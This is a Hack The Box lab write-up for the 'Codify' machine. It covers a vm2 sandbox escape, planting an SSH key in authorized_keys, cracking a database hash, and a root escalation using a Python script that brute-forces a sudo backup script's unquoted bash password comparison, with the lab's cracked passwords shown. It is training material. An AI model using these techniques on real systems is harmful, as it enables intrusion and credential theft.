---
author: cruxqsec
date: '2024-01-15'
description: Easy difficulty Linux machine from Hack the box
summary: Easy difficulty Linux machine from Hack the box
tags: ["htb", "linux", "rce", "password-cracking"]
title: HTB Codify
---


## Enumeration

Running a starting <kbd>`nmap`</kbd> scan:

```bash
nmap -sC -sV 10.10.11.239 -oA nmap/nmap
``` 

![image 1](img/1.png)

At port 80 we find a webserver with the hostname of `codify.htb` which we add into `/etc/hosts`. 
If we <kbd>`curl`</kbd> it, it says the document has moved to `codify.htb`. 
So both these open services are basically the same thing - a simple code editor for NodeJS with "limited" functionality. 
The allowed modules are specified on the site.

![image 2](img/2.png)

It is apparently using a sandboxing tool called <kbd>`vm2`</kbd> (the links points out to the 3.9.16 version). 
If we search for any publicly available exploits we find there are some available.
We will search for those later.

![image 3](img/3.png)

Looking at the editor and the list of allowed modules we can easily enumerate some basic info about the system.

![image 4](img/4.png)

Let's try to find a way to read files even without `fs` module. 
Found a way to import the `fs/promises` module with `var fs = require('fs/promises')`.
But could not read the file because I was getting `[Object Promise]` returned.
Tried some more tricks but none of them worked.

<kbd>`gobuster`</kbd> virtual host enumeration found no subdomains. It also didn't find any files.


## Initial foothold

So returning back to the `vm2` library I found a [sandbox escape](https://gist.github.com/leesh3288/f05730165799bf56d70391f3d9ea187c) with which we get RCE.

![image 5](img/5.png)

With this code we can execute commands. I tried to execute a reverse shell with <kbd>`bash`</kbd> and with
<kbd>`nc`</kbd> but was unsuccessful. I gave up on trying other things so I just generated a SSH key 
with <kbd>`ssh-keygen`</kbd> and wrote it inside   
`/home/srv/.ssh/authorized_keys` and logged into the box.

I got the users with 

```bash
cat /etc/passwd | grep bash
```

We find out that this is not the user because it doesn't have the `user.txt`.

I searched the web root directory and found `/var/www/contacts` and inside it there was a `tickets.db` file which 
is a Sqlite3 database. Inside that I found a hash which I tried to crack using <kbd>`john`</kbd> and 
<kbd>`hashcat`</kbd>. <kbd>`hashcat`</kbd> found the correct password of **`spongebob1`** using `rockyou.txt`.  

## Privilege escalation

I found a command we can run with sudo by using <kbd>`sudo -l`</kbd>. 
It's a custom script that backups the MySQL database.

```bash
#!/bin/bash
DB_USER="root"
DB_PASS=$(/usr/bin/cat /root/.creds)
BACKUP_DIR="/var/backups/mysql"

read -s -p "Enter MySQL password for $DB_USER: " USER_PASS
/usr/bin/echo

if [[ $DB_PASS == $USER_PASS ]]; then
        /usr/bin/echo "Password confirmed!"
else
        /usr/bin/echo "Password confirmation failed!"
        exit 1
fi

/usr/bin/mkdir -p "$BACKUP_DIR"

databases=$(/usr/bin/mysql -u "$DB_USER" -h 0.0.0.0 -P 3306 -p"$DB_PASS" -e "SHOW DATABASES;" | /usr/bin/grep -Ev "(Database|information_schema|performance_schema)")

for db in $databases; do
    /usr/bin/echo "Backing up database: $db"
    /usr/bin/mysqldump --force -u "$DB_USER" -h 0.0.0.0 -P 3306 -p"$DB_PASS" "$db" | /usr/bin/gzip > "$BACKUP_DIR/$db.sql.gz"
done

/usr/bin/echo "All databases backed up successfully!"
/usr/bin/echo "Changing the permissions"
/usr/bin/chown root:sys-adm "$BACKUP_DIR"
/usr/bin/chmod 774 -R "$BACKUP_DIR"
/usr/bin/echo 'Done!'
```

With some help I found out that we can bruteforce this script because `bash` is vulnerable to regex matching.
This means that if a password `test` is compared to `t*` or `tes*` it will succeed 
(the `*` char matches all characters). So this means we can bruteforce this script by simply trying all characters 
and adding `*`  at the end and checking if it succeeds. So again using some help (writeup) and on my own 
I wrote a simple `Python` script.

```python
import subprocess
import string

all_chars = string.ascii_letters + string.digits
found = False
character = ""
password = ""

while not found:
    for c in all_chars:
        character = f"{c}*"
        command = f"/usr/bin/echo {password}{character} | sudo /opt/scripts/mysql_backup.sh"
        result = subprocess.run(command, stdout=subprocess.PIPE, shell=True, text=True).stdout

        if "Password confirmed!" in result:
            password += c
            print(password)
```

After running it we get the password `kljh12k3jhaskjh12kjh3` which is the root password.
So we can loggin with <kbd.`su`</kbd> because root login seems to be dissallowed from SSH. <kbd>`Pwned!`</kbd>
